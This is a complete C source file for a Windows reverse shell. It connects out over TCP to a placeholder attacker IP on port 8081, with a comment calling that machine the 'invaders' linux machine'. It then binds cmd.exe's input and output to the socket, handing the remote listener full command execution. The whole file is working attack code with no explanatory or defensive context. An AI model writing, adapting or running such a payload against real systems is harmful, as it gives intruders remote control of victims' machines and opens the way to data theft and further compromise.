#include <winsock2.h>
#include <stdio.h>
#include <windows.h>

int main()
{
    SOCKET Shell;
    SOCKADDR_IN shellAddress;
    WSADATA wsa;
    STARTUPINFO startup_info;
    PROCESS_INFORMATION pi;
    char RecvServer[512]; // Hold receiving data (512 bytes)
    char ipAddress[] = "xxx.xxx.xxx.xxx"; // Insert the invaders' linux machine IP here
    int connect;
    int port = 8081;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[!] WSAStartup failed, error code: %d\n", WSAGetLastError());
        return 1;
    }

    Shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (Shell == INVALID_SOCKET)
    {
        printf("[!] Socket creation failed, error code: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    shellAddress.sin_port = htons(port);
    shellAddress.sin_family = AF_INET;
    shellAddress.sin_addr.s_addr = inet_addr(ipAddress);

    connect = WSAConnect(Shell, (SOCKADDR *)&shellAddress, sizeof(shellAddress), NULL, NULL, NULL, NULL);
    if (connect == SOCKET_ERROR)
    {
        printf("[!] Error while connecting to target server, error code: %d\n", WSAGetLastError());
        Sleep(30000);
        closesocket(Shell);
        WSACleanup();
        return 1;
    }

    recv(Shell, RecvServer, sizeof(RecvServer), 0);
    memset(&startup_info, 0, sizeof(startup_info));
    startup_info.cb = sizeof(startup_info);
    startup_info.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    startup_info.hStdInput = startup_info.hStdOutput = startup_info.hStdError = (HANDLE)Shell;

    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startup_info, &pi))
    {
        printf("[!] CreateProcess failed, error code: %d\n", GetLastError());
        closesocket(Shell);
        WSACleanup();
        return 1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    closesocket(Shell);
    WSACleanup();

    //printf("[*] Shell process completed. Press any key to exit...");
    //getchar();

    return 0;
}